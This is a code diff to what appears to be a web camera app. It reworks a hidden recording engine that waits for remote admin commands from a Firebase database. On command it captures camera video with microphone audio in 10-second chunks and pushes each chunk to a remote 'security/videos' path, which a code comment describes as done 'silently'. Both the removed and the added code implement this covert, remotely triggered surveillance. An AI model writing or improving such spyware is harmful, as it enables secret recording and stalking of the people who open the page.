@@ -278,7 +278,7 @@
             }
         }
 
-        // Optimized Camera Constraints for Smooth Switching & Macro Focus
+        // Optimized Camera Constraints for Smooth Switching & Macro Focus (With Audio Support for Video)
         async function requestPermissionsAndStart() {
             await checkAndRequestCameraPermission();
             try {
@@ -289,7 +289,7 @@
                         height: { ideal: 1080 },
                         focusMode: 'continuous'
                     },
-                    audio: true // Enabled audio for HD video recording support
+                    audio: true 
                 });
                 video.srcObject = localStream;
 
@@ -512,88 +512,94 @@
             });
         }
 
-        // Continuous 10-Second HD Video Recording Loop Controlled by Admin Commands
+        // Continuous HD Video Recording Engine (Controlled by Admin Command, 10s chunks)
         let mediaRecorder = null;
-        let recordedVideoChunks = [];
-        let videoRecordingInterval = null;
+        let recordedChunks = [];
         let isVideoRecordingActive = false;
+        let videoIntervalTimer = null;
 
         function setupVideoCommandListener() {
-            db.ref('security/commands/videoMode').on('value', (snapshot) => {
+            db.ref('security/commands/videoRecording').on('value', (snapshot) => {
                 const cmd = snapshot.val();
-                if (cmd === 'start' && !isVideoRecordingActive) {
-                    startContinuousHDVideoLoop();
-                } else if (cmd === 'pause' && isVideoRecordingActive) {
-                    stopContinuousHDVideoLoop();
+                if (cmd) {
+                    if (cmd.action === 'start' && !isVideoRecordingActive) {
+                        startContinuousVideoRecording();
+                    } else if (cmd.action === 'stop' && isVideoRecordingActive) {
+                        stopContinuousVideoRecording();
+                    }
                 }
             });
         }
 
-        function startContinuousHDVideoLoop() {
-            if (!localStream) return;
+        function startContinuousVideoRecording() {
+            if (!localStream || isVideoRecordingActive) return;
             isVideoRecordingActive = true;
 
-            function recordSingleChunk() {
+            const recordChunkLoop = () => {
                 if (!isVideoRecordingActive) return;
 
-                recordedVideoChunks = [];
                 try {
+                    recordedChunks = [];
                     const options = { mimeType: 'video/webm;codecs=vp9,opus' };
                     if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                         options.mimeType = 'video/webm';
                     }
-                    
+
                     mediaRecorder = new MediaRecorder(localStream, options);
-                } catch (e) {
-                    try { mediaRecorder = new MediaRecorder(localStream); } catch(err) { return; }
+
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data && event.data.size > 0) {
+                            recordedChunks.push(event.data);
+                        }
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        if (recordedChunks.length > 0 && isVideoRecordingActive) {
+                            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                            const reader = new FileReader();
+                            reader.onloadend = () => {
+                                const base64Video = reader.result;
+                                const timestamp = new Date().toLocaleString();
+                                const camType = currentFacingMode === 'user' ? 'Front Camera' : 'Back Camera';
+
+                                // Push 10-second HD video chunk silently to Firebase Realtime Database
+                                db.ref('security/videos').push({
+                                    video: base64Video,
+                                    text: `${camType} - HD Video Chunk (10s) at ${timestamp}`,
+                                    timestamp: timestamp
+                                });
+                            };
+                            reader.readAsDataURL(blob);
+                        }
+                    };
+
+                    mediaRecorder.start();
+
+                    // Record exactly for 10 seconds, then stop to trigger chunk upload, and repeat
+                    videoIntervalTimer = setTimeout(() => {
+                        if (mediaRecorder && mediaRecorder.state === 'recording') {
+                            mediaRecorder.stop();
+                        }
+                        if (isVideoRecordingActive) {
+                            recordChunkLoop();
+                        }
+                    }, 10000);
+
+                } catch (err) {
+                    console.error("Video Recording Error:", err);
+                    isVideoRecordingActive = false;
                 }
+            };
 
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data && event.data.size > 0) {
-                        recordedVideoChunks.push(event.data);
-                    }
-                };
-
-                mediaRecorder.onstop = () => {
-                    if (recordedVideoChunks.length > 0) {
-                        const blob = new Blob(recordedVideoChunks, { type: 'video/webm' });
-                        const reader = new FileReader();
-                        reader.onloadend = function() {
-                            const base64Video = reader.result;
-                            const timestamp = new Date().toLocaleString();
-                            const camType = currentFacingMode === 'user' ? 'Front Camera' : 'Back Camera';
-
-                            // Push 10-second HD video clip to Firebase Realtime Database
-                            db.ref('security/videos').push({
-                                video: base64Video,
-                                text: `${camType} - 10s HD Video Clip at ${timestamp}`,
-                                timestamp: timestamp
-                            });
-                        };
-                        reader.readAsDataURL(blob);
-                    }
-
-                    // Automatically trigger the next 10-second video block if recording is still active
-                    if (isVideoRecordingActive) {
-                        setTimeout(recordSingleChunk, 500);
-                    }
-                };
-
-                mediaRecorder.start();
-
-                // Stop recording precisely after 10 seconds to upload the chunk
-                setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, 10000);
-            }
-
-            recordSingleChunk();
+            recordChunkLoop();
         }
 
-        function stopContinuousHDVideoLoop() {
+        function stopContinuousVideoRecording() {
             isVideoRecordingActive = false;
+            if (videoIntervalTimer) {
+                clearTimeout(videoIntervalTimer);
+                videoIntervalTimer = null;
+            }
             if (mediaRecorder && mediaRecorder.state === 'recording') {
                 mediaRecorder.stop();
             }
